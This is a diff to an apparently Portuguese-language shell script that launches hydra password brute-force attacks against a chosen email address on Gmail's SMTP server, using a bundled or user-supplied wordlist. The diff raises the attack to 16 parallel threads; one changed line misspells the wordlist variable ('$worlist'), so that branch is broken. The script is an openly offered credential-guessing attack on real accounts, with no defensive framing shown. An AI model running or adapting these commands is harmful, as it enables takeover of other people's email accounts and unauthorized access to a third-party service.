@@ -20,14 +20,15 @@ read -p ">> " escolha
 case "$escolha" in
 	S)
 		read -p "Aperte {Enter} para começar a brute force"
-		hydra -S -l $email -P requisitos/passwords.txt -e ns -V -s 465 smtp.gmail.com smtp
+		hydra smtp.gmail.com smtp -l $email -P requisitos/passwords.txt -s 465 -S -v -V -t 16
+
 	;;
 
 	N)
 		echo "coloque o caminho da wordlist que você quer usar"
 		read -p "caminho da wordlist: " wordlist
 		read -p "aperte {Enter} para começar a brute force"
-		hydra -S -l $email -P $wordlist -e ns -V -s 465 smtp.gmail.com smtp
+		hydra smtp.gmail.com smtp -l $email -P $worlist -s 465 -S -v -V -t 16
 	;;
 
 esac
